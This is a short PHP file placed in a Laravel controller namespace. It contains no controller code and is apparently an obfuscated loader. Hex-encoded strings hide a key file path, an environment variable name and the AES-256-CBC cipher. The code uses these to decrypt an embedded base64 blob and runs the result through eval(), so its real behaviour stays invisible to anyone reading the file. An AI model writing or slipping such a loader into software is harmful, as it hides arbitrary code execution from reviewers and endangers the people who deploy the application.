<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('jvErGyO3UP9tZJ8aDspoHA==');

$c=base64_decode(

'eQRbpzuW2QR+Hda0ShmhzDabRHOz21+8xLLMgx0vmaFL9V9QEeQ3uucZ3/sJdPEP75erckkhU8vS' .
's4sAlRQnQHDdZpG9njFXT61ZdJlxsY8eLeG3CBFoWt+mIcBbfQ78XnskBJhCoqFe7sJkyIWC4hzy' .
'S46v+h5G8GIqYVMNVK12S0hmeHauenwveNrN6j/Je3TYpdWDcyltuihS7T/2qOmUSaVV/okIumkD' .
'jusEueqHPW1FXOAvmMlrMAq/1f3x'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

